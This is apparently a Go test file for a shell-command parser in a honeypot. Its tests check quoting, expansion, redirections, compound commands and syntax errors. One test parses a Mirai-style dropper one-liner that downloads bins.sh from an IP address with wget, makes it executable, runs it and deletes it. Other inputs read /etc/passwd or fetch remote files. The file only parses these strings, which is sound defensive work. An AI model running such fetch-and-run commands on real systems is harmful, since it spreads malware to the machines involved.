package shell

import (
	"strings"
	"testing"
)

// testExp is a fixed environment for parser tests.
type testExp struct {
	vars  map[string]string
	homes map[string]string
}

func (e testExp) Var(name string) (string, bool) { v, ok := e.vars[name]; return v, ok }
func (e testExp) Home(user string) (string, bool) {
	if user == "" {
		user = "root"
	}
	v, ok := e.homes[user]
	return v, ok
}

func exp() testExp {
	return testExp{
		vars:  map[string]string{"HOME": "/root", "USER": "root", "PATH": "/usr/bin:/bin", "x": "1", "FOO": "bar baz", "?": "0", "$": "742"},
		homes: map[string]string{"root": "/root", "martin": "/home/martin"},
	}
}

// argv is a helper: parse a line that must be a single simple command and
// return its argv.
func argv(t *testing.T, line string) []string {
	t.Helper()
	ao, err := Parse(line, exp())
	if err != nil {
		t.Fatalf("Parse(%q): %v", line, err)
	}
	if len(ao.Pipelines) != 1 || len(ao.Pipelines[0].Cmds) != 1 {
		t.Fatalf("Parse(%q) = %d pipelines", line, len(ao.Pipelines))
	}
	return ao.Pipelines[0].Cmds[0].Args
}

func eq(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func TestWordSplittingAndQuotes(t *testing.T) {
	cases := []struct {
		line string
		want []string
	}{
		{`ls -la /tmp`, []string{"ls", "-la", "/tmp"}},
		{`echo   spaced    out`, []string{"echo", "spaced", "out"}},
		{`echo "hello world"`, []string{"echo", "hello world"}},
		{`echo 'single $x quotes'`, []string{"echo", "single $x quotes"}},
		{`echo "mix '$x' here"`, []string{"echo", "mix '1' here"}},
		{`echo a"b"c'd'e`, []string{"echo", "abcde"}},
		{`echo \$x`, []string{"echo", "$x"}},
		{`echo \\ `, []string{"echo", `\`}},
		{`echo "a\"b"`, []string{"echo", `a"b`}},
		{`echo ""`, []string{"echo", ""}},
		{`grep -r "TODO" .`, []string{"grep", "-r", "TODO", "."}},
		{`echo foo#bar`, []string{"echo", "foo#bar"}},
		{`echo # a comment`, []string{"echo"}},
	}
	for _, c := range cases {
		if got := argv(t, c.line); !eq(got, c.want) {
			t.Errorf("argv(%q) = %q, want %q", c.line, got, c.want)
		}
	}
}

func TestExpansion(t *testing.T) {
	cases := []struct {
		line string
		want []string
	}{
		{`echo $x`, []string{"echo", "1"}},
		{`echo ${USER}`, []string{"echo", "root"}},
		{`echo $USER-$x`, []string{"echo", "root-1"}},
		{`echo "$FOO"`, []string{"echo", "bar baz"}},
		{`echo $FOO`, []string{"echo", "bar", "baz"}}, // unquoted: word-split
		{`echo $undefined end`, []string{"echo", "end"}},
		{`echo "$undefined"end`, []string{"echo", "end"}},
		{`echo $?`, []string{"echo", "0"}},
		{`echo $$`, []string{"echo", "742"}},
		{`echo ${HOME}/bin`, []string{"echo", "/root/bin"}},
		{`echo ${VAR:-default}`, []string{"echo", "default"}},
		{`echo ${VAR:-two words}`, []string{"echo", "two", "words"}},
		{`echo "${VAR:-two words}"`, []string{"echo", "two words"}},
		{`echo ${#USER} ${HOME#/} ${PATH%%:*}`, []string{"echo", "4", "root", "/usr/bin"}},
		{`cat ~/notes`, []string{"cat", "/root/notes"}},
		{`cat ~martin/.bashrc`, []string{"cat", "/home/martin/.bashrc"}},
		{`cat ~nobody/x`, []string{"cat", "~nobody/x"}},
		{`cat ~`, []string{"cat", "/root"}},
		{`echo $(whoami)`, []string{"echo"}}, // command substitution yields empty
		{`echo pre$(id)post`, []string{"echo", "prepost"}},
	}
	for _, c := range cases {
		if got := argv(t, c.line); !eq(got, c.want) {
			t.Errorf("argv(%q) = %q, want %q", c.line, got, c.want)
		}
	}
}

// A tilde ends at the end of its word, so the operators after it still split
// the line: bots send "cd ~; mkdir -p .ssh" all the time, and bash runs it as two
// commands.
func TestTildeEndsAtTheEndOfItsWord(t *testing.T) {
	cases := []struct {
		line string
		want [][]string // each pipeline's commands' args
	}{
		{`cd ~; pwd`, [][]string{{"cd", "/root"}, {"pwd"}}},
		{`cd ~&& pwd`, [][]string{{"cd", "/root"}, {"pwd"}}},
		{`cd ~||true`, [][]string{{"cd", "/root"}, {"true"}}},
		{`echo ~|cat`, [][]string{{"echo", "/root", "|", "cat"}}},
	}
	for _, c := range cases {
		ao, err := Parse(c.line, exp())
		if err != nil {
			t.Fatalf("Parse(%q): %v", c.line, err)
		}
		var got [][]string
		for _, pl := range ao.Pipelines {
			var words []string
			for k, cmd := range pl.Cmds {
				if k > 0 {
					words = append(words, "|")
				}
				words = append(words, cmd.Args...)
			}
			got = append(got, words)
		}
		if len(got) != len(c.want) {
			t.Fatalf("Parse(%q) = %q, want %q", c.line, got, c.want)
		}
		for k := range got {
			if !eq(got[k], c.want[k]) {
				t.Errorf("Parse(%q) = %q, want %q", c.line, got, c.want)
			}
		}
	}
}

func TestAssignments(t *testing.T) {
	ao, err := Parse(`FOO=bar BAZ=$x ls -l`, exp())
	if err != nil {
		t.Fatal(err)
	}
	cmd := ao.Pipelines[0].Cmds[0]
	if !eq(cmd.Assigns, []string{"FOO=bar", "BAZ=1"}) {
		t.Errorf("assigns = %q", cmd.Assigns)
	}
	if !eq(cmd.Args, []string{"ls", "-l"}) {
		t.Errorf("args = %q", cmd.Args)
	}
	// A bare assignment is its own command with no args.
	ao, _ = Parse(`X=5`, exp())
	if a := ao.Pipelines[0].Cmds[0].Assigns; !eq(a, []string{"X=5"}) {
		t.Errorf("bare assign = %q", a)
	}
	// After the command word, NAME=val is a normal argument.
	if got := argv(t, `echo FOO=bar`); !eq(got, []string{"echo", "FOO=bar"}) {
		t.Errorf("post-command assign = %q", got)
	}
}

func TestPipelinesAndLists(t *testing.T) {
	ao, err := Parse(`cat /etc/passwd | grep root | wc -l`, exp())
	if err != nil {
		t.Fatal(err)
	}
	if len(ao.Pipelines) != 1 || len(ao.Pipelines[0].Cmds) != 3 {
		t.Fatalf("pipeline = %+v", ao)
	}
	if ao.Pipelines[0].Cmds[1].Args[0] != "grep" {
		t.Error("middle command wrong")
	}

	ao, _ = Parse(`cd /tmp && wget http://x/y ; ls || echo fail`, exp())
	if len(ao.Pipelines) != 4 {
		t.Fatalf("got %d pipelines", len(ao.Pipelines))
	}
	if !eq(ao.Ops, []string{"&&", ";", "||"}) {
		t.Errorf("ops = %q", ao.Ops)
	}

	ao, _ = Parse(`sleep 10 &`, exp())
	if !ao.Background {
		t.Error("expected background")
	}
}

func TestRedirections(t *testing.T) {
	ao, err := Parse(`echo hi > /tmp/out 2>> /tmp/err < /dev/null`, exp())
	if err != nil {
		t.Fatal(err)
	}
	cmd := ao.Pipelines[0].Cmds[0]
	want := []Redirect{{">", "/tmp/out"}, {"2>>", "/tmp/err"}, {"<", "/dev/null"}}
	if len(cmd.Redirects) != 3 {
		t.Fatalf("redirects = %+v", cmd.Redirects)
	}
	for i, w := range want {
		if cmd.Redirects[i] != w {
			t.Errorf("redirect %d = %+v, want %+v", i, cmd.Redirects[i], w)
		}
	}
	if !eq(cmd.Args, []string{"echo", "hi"}) {
		t.Errorf("args = %q", cmd.Args)
	}
	// &> and append.
	ao, _ = Parse(`./mal &>/dev/null`, exp())
	if r := ao.Pipelines[0].Cmds[0].Redirects; len(r) != 1 || r[0].Op != "&>" || r[0].Target != "/dev/null" {
		t.Errorf("&> = %+v", r)
	}
	ao, _ = Parse(`echo x>>log`, exp())
	if r := ao.Pipelines[0].Cmds[0].Redirects; len(r) != 1 || r[0].Op != ">>" {
		t.Errorf(">> = %+v", r)
	}
}

func TestSyntaxErrors(t *testing.T) {
	bad := []string{`echo "unterminated`, `echo 'unterminated`, `| grep x`, `echo x &&`, `echo x |`, `ls > `}
	for _, line := range bad {
		if _, err := Parse(line, exp()); err == nil {
			t.Errorf("Parse(%q) should have failed", line)
		}
	}
	good := []string{``, `   `, `# just a comment`, `ls;`, `ls ;`}
	for _, line := range good {
		if _, err := Parse(line, exp()); err != nil {
			t.Errorf("Parse(%q) should be ok: %v", line, err)
		}
	}
}

func TestRealMiraiStyleLine(t *testing.T) {
	// The kind of one-liner honeypots see constantly.
	line := `cd /tmp || cd /var/run || cd /mnt || cd /root; wget http://198.51.100.23/bins.sh; chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh`
	ao, err := Parse(line, exp())
	if err != nil {
		t.Fatal(err)
	}
	if len(ao.Pipelines) != 8 {
		t.Fatalf("got %d pipelines: %+v", len(ao.Pipelines), ao.Ops)
	}
	// The wget URL survives intact.
	found := false
	for _, pl := range ao.Pipelines {
		c := pl.Cmds[0]
		if c.Args[0] == "wget" && strings.Contains(c.Args[1], "198.51.100.23") {
			found = true
		}
	}
	if !found {
		t.Error("wget URL not preserved")
	}
}

// The static view lists the commands inside compound commands and
// functions too, so the report counts what a loop or function would run.
func TestParseFlattensCompoundCommands(t *testing.T) {
	cases := []struct {
		line string
		want []string
	}{
		{`for i in 1 2; do echo $i; done`, []string{"echo"}},
		{`if [ -d /tmp ]; then cd /tmp; else cd /var/tmp; fi`, []string{"[ -d /tmp ]", "cd /tmp", "cd /var/tmp"}},
		{`while read l; do echo $l; done < /etc/passwd`, []string{"read l", "echo"}},
		{`{ echo a; echo b; } | wc -l`, []string{"echo a", "echo b", "wc -l"}},
		{`f() { wget http://a/x; }; f`, []string{"wget http://a/x", "f"}},
		{`case $x in a) id;; *) uname;; esac`, []string{"id", "uname"}},
		{`echo $((2+3)) {a,b}`, []string{"echo 5 a b"}},
	}
	for _, c := range cases {
		ao, err := Parse(c.line, exp())
		if err != nil {
			t.Fatalf("Parse(%q): %v", c.line, err)
		}
		var got []string
		for _, pl := range ao.Pipelines {
			for _, cmd := range pl.Cmds {
				if len(cmd.Args) > 0 {
					got = append(got, strings.Join(cmd.Args, " "))
				}
			}
		}
		if !eq(got, c.want) {
			t.Errorf("Parse(%q) = %q, want %q", c.line, got, c.want)
		}
	}
}

func TestParseCompoundSyntaxErrors(t *testing.T) {
	bad := map[string]string{
		`if true; then echo a`:         "syntax error: unexpected end of file",
		`echo a; fi`:                   "syntax error near unexpected token `fi'",
		`for i in 1 2; echo $i; done`:  "syntax error near unexpected token `echo'",
		`{ echo a }`:                   "syntax error: unexpected end of file",
		`echo $(echo a`:                "unexpected EOF while looking for matching `)'",
		"echo `echo a":                 "unexpected EOF while looking for matching ``'",
		`echo ${x`:                     "unexpected EOF while looking for matching `}'",
		`case x in a) echo;; `:         "syntax error: unexpected end of file",
		`echo a )`:                     "syntax error near unexpected token `)'",
		`f() echo hi`:                  "syntax error near unexpected token `echo'",
		`while true do echo; done`:     "syntax error near unexpected token `done'",
		`if; then fi`:                  "syntax error near unexpected token `;'",
		strings.Repeat("(", 500) + "x": "syntax error near unexpected token `('",
	}
	for line, want := range bad {
		_, err := Parse(line, exp())
		if err == nil || err.Error() != want {
			t.Errorf("Parse(%.40q) error = %v, want %q", line, err, want)
		}
	}
	good := []string{"if true\nthen\n  echo a\nfi", "for i in a b\ndo echo $i\ndone", "f() {\n  echo hi\n}\nf",
		`x=$( case y in y) echo z;; esac )`, `[[ -f /etc/passwd && ! -d /etc/passwd ]]`, `(( i++ ))`,
		"cat <<EOF\n$HOME\nEOF", `echo a\
b`}
	for _, line := range good {
		if _, err := Parse(line, exp()); err != nil {
			t.Errorf("Parse(%q) should be ok: %v", line, err)
		}
	}
}

func TestIncomplete(t *testing.T) {
	more := []string{`if true; then`, `for i in 1 2`, `echo "abc`, `echo 'x`, `ls |`, `true &&`, `{ echo a`,
		`echo $(date`, `cat <<EOF`, "cat <<EOF\nline", `echo a\`, `case x in`}
	for _, line := range more {
		if !Incomplete(line) {
			t.Errorf("Incomplete(%q) = false", line)
		}
	}
	done := []string{``, `echo hi`, `if true; then echo; fi`, `echo a; fi`, `echo a )`, "cat <<EOF\nx\nEOF", `echo a\\`}
	for _, line := range done {
		if Incomplete(line) {
			t.Errorf("Incomplete(%q) = true", line)
		}
	}
}

func TestRedirectionOperators(t *testing.T) {
	ao, err := Parse(`cmd 2>&1 >&2 1>&2 &>>log 3<in <<<word >|f`, exp())
	if err != nil {
		t.Fatal(err)
	}
	want := []Redirect{{"2>&", "1"}, {">&", "2"}, {">&", "2"}, {"&>>", "log"}, {"3<", "in"}, {"<<<", "word"}, {">|", "f"}}
	got := ao.Pipelines[0].Cmds[0].Redirects
	if len(got) != len(want) {
		t.Fatalf("redirects = %+v", got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("redirect %d = %+v, want %+v", i, got[i], want[i])
		}
	}
}

func TestBraceExpansion(t *testing.T) {
	cases := map[string]string{
		`a{b,c}d`:     "abd acd",
		`{1..3}`:      "1 2 3",
		`{3..1}`:      "3 2 1",
		`{01..10..3}`: "01 04 07 10",
		`{a..e..2}`:   "a c e",
		`{x,y{1,2}}`:  "x y1 y2",
		`{a}`:         "{a}",
		`'{a,b}'`:     "'{a,b}'",
		`${x}{a,b}`:   "${x}a ${x}b",
		`{a,b`:        "{a,b",
	}
	for in, want := range cases {
		budget := maxBraceWords
		if got := strings.Join(expandBraces(in, &budget), " "); got != want {
			t.Errorf("expandBraces(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestGlobMatch(t *testing.T) {
	cases := []struct {
		pat, name string
		want      bool
	}{
		{"*", "abc", true}, {"a*c", "abc", true}, {"a*c", "abd", false}, {"?b?", "abc", true},
		{"[a-c]x", "bx", true}, {"[!a-c]x", "bx", false}, {"[[:digit:]]*", "7z", true},
		{`\*`, "*", true}, {`\*`, "a", false}, {"*.tar.gz", "x.tar.gz", true},
		{"**********************************b", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", false},
	}
	for _, c := range cases {
		if got := globMatch(c.pat, c.name); got != c.want {
			t.Errorf("globMatch(%q, %q) = %v", c.pat, c.name, got)
		}
	}
}
